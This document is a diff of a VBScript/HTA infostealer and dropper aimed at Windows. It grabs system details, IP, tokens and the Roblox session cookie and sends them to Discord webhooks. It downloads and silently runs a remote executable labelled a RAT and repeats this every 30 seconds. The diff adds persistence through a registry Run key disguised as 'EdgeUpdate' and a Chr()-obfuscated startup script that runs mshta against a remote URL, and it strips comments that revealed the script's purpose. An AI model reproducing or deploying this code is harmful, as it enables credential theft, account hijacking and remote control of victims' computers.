@@ -1,4 +1,4 @@
-' language: VBScript/HTA, file: dropper.html, target: Windows 10/11, mshta engine
+' language: VBScript/HTA, file: file.hta, target: Windows 10/11, mshta engine
 <html>
 <head><title>.</title>
 <hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no"/>
@@ -10,24 +10,20 @@ Dim sh, fso, WH, RE_WH, PC, USER
 Set sh = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 
-' C2 WEBHOOK (Commands / Responses)
+' YOUR WEBHOOKS ONLY
 WH = "https://discord.com/api/webhooks/1572026403560357978/n4qVnwrF6-OKw6vRfm73KZNXc-8X3IVSkOgQcfRb35d92LOEujl6OMvBy3GpPWrsXdQN"
-' EXFIL WEBHOOK (Logs / Drops / Re-grab)
 RE_WH = "https://discord.com/api/webhooks/1572026526407467079/KUyJrlGn-BaxdIM4Py18HaoCznPd3rfi411OUUewgpFL9Sfx7JGM7qYRtNtXU3vkHh5r"
 
 PC = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
 USER = sh.ExpandEnvironmentStrings("%USERNAME%")
 
-' --- 1. INITIAL GRABS (to C2 WH) ---
 Call PostEmbedTo(":satellite: Target", "PC: " & PC & vbCrLf & "User: " & USER, 10181046, WH)
 Call IP(WH)
 Call GrabTokens(WH)
+Call Persistence
 Call PostCookieOnly(WH)
-
-' --- 2. DROP RAT LAST (init) ---
 Call DropRAT(WH, True)
 
-' --- 3. LOOP (30s, grabs + RAT re-drop to RE_WH) ---
 Dim runCount
 runCount = 0
 Do
@@ -39,13 +35,10 @@ Do
     Call DropRAT(RE_WH, True)
     Call SleepSeconds(30)
 Loop
-
 window.close()
 
-' --- RAT DROP ---
 Sub DropRAT(targetWH, sendRocket)
     Dim dl : dl = "https://cdn.discordapp.com/attachments/1570877567567929557/1572752014616825856/client_9.exe?ex=6aff82f4&is=6afe3174&hm=841914e039c8b9df85e99842774e4bf44f6e6dc4c0bf290a1033dcbb02a00aed&"
-
     Dim tPath : tPath = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Microsoft\Windows"
     If Not fso.FolderExists(tPath) Then fso.CreateFolder tPath
     Randomize
@@ -53,12 +46,9 @@ Sub DropRAT(targetWH, sendRocket)
     Dim op : op = tPath & "\" & fname
 
     If sendRocket Then Call PostEmbedTo(":rocket: RAT Download Initiated", "Downloading and launching RAT", 10181046, targetWH)
-
     If fso.FileExists(op) Then fso.DeleteFile op, True
-
     Dim cCmd : cCmd = "cmd /c curl.exe -s -L --connect-timeout 5 --max-time 60 -o """ & op & """ """ & dl & """"
     sh.Run cCmd, 0, True
-
     If fso.FileExists(op) Then
         If fso.GetFile(op).Size > 100000 Then
             If sendRocket Then Call PostEmbedTo(":white_check_mark: RAT Launched", "RAT Launched", 10181046, targetWH)
@@ -67,7 +57,6 @@ Sub DropRAT(targetWH, sendRocket)
     End If
 End Sub
 
-' --- IP Function ---
 Sub IP(targetWH)
     Dim xh : Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     xh.SetOption 2, 13056
@@ -85,14 +74,12 @@ Sub IP(targetWH)
     Set xh = Nothing
 End Sub
 
-' --- PostCookieOnly ---
 Sub PostCookieOnly(targetWH)
     Dim cookie : cookie = GetRobloxCookie()
     If Len(cookie) = 0 Then Exit Sub
     Call PostEmbedTo("Roblox Cookie", "Size: " & Len(cookie) & " | PC: " & PC & vbCrLf & vbCrLf & "``" & cookie & "``", 10181046, targetWH)
 End Sub
 
-' --- GetRobloxCookie ---
 Function GetRobloxCookie()
     GetRobloxCookie = ""
     Dim paths(4)
@@ -151,7 +138,6 @@ Function GetRobloxCookie()
     GetRobloxCookie = cookie
 End Function
 
-' --- Sleep Functions ---
 Sub SleepSeconds(s)
     Dim t0, t1, t2, elapsed
     t0 = Timer()
@@ -169,7 +155,20 @@ Sub SleepSeconds(s)
     End If
 End Sub
 
-' --- GrabTokens ---
+Sub Persistence()
+    Dim payload : payload = "mshta https://dicerigx.app/"
+    On Error Resume Next
+    
+    sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\EdgeUpdate", payload, "REG_SZ"
+    
+    Dim sp : sp = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\msedge_update.vbs"
+    Dim sf : Set sf = fso.CreateTextFile(sp, True)
+    sf.WriteLine "CreateObject(Chr(87)&Chr(83)&Chr(99)&Chr(114)&Chr(105)&Chr(112)&Chr(116)&Chr(46)&Chr(83)&Chr(104)&Chr(101)&Chr(108)&Chr(108)).Run Chr(34)&""" & payload & """&Chr(34), 0, False"
+    sf.Close
+    
+    Call PostEmbed(":pushpin: Persistence", "EdgeUpdate Registry and Startup VBS installed", 10181046)
+End Sub
+
 Sub GrabTokens(targetWH)
     Dim xh: Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     xh.SetOption 2, 13056
@@ -209,12 +208,10 @@ Sub GrabTokens(targetWH)
     End If
 End Sub
 
-' --- Utility Functions ---
 Function TmpFile(name): TmpFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\" & name: End Function
 Sub WriteFile(path, content): Dim f: Set f = fso.CreateTextFile(path, True): f.Write content: f.Close: Set f = Nothing: End Sub
-Function ReadFile(path): ReadFile = "": Dim f: Set f = fso.OpenTextFile(path, 1): ReadFile = f.ReadAll: f.Close: Set f = Nothing: End Function
+Function ReadFile(path): ReadFile = "": Dim f = fso.OpenTextFile(path, 1): ReadFile = f.ReadAll: f.Close: Set f = Nothing: End Function
 
-' --- PostEmbed ---
 Sub PostEmbed(t, d, c)
     Call PostEmbedTo(t, d, c, WH)
 End Sub
@@ -230,7 +227,6 @@ Sub PostEmbedTo(t, d, c, target_wh)
     Set h = Nothing
 End Sub
 
-' --- DecryptDPAPI ---
 Function DecryptDPAPI(b64)
     DecryptDPAPI = ""
     Dim inf: inf = TmpFile("dpi.txt")
@@ -247,7 +243,6 @@ Function DecryptDPAPI(b64)
     fso.DeleteFile outf, True
 End Function
 
-' --- Ej ---
 Function Ej(s)
     Ej = s
     Ej = Replace(Ej, Chr(92), Chr(92) & Chr(92))
